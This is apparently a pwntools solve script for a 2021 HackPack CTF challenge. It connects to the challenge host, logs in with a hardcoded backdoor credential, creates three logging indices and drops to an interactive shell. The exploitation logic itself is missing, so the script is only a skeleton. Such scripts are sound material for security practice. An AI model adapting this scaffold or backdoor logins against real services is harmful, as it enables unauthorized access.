#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
context.terminal = ["tilix","-a","session-add-right","-e"]

exe = context.binary = ELF('./chall')

host = args.HOST or 'ctf2021.hackpack.club'
port = int(args.PORT or 11001)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

def choice(option):
    io.sendlineafter("> ", str(option))

def login():
    io.sendlineafter("> ", "1")
    io.sendlineafter(": ", "administrator")
    io.sendlineafter(": ", "S3CreTB4CkD0or")

def createloggingindex(idx):
    choice(1)
    io.sendlineafter(": ", idx)


def deleteloggingindex(idx):
    choice(2)
    io.sendlineafter(": ", idx)

def dumploggingindex(idx):
    choice(3)
    io.sendlineafter(": ", idx)

def logout():
    choice(4)


io = start()
login()
createloggingindex("0")
createloggingindex("1")
createloggingindex("2")
logout()
io.interactive()

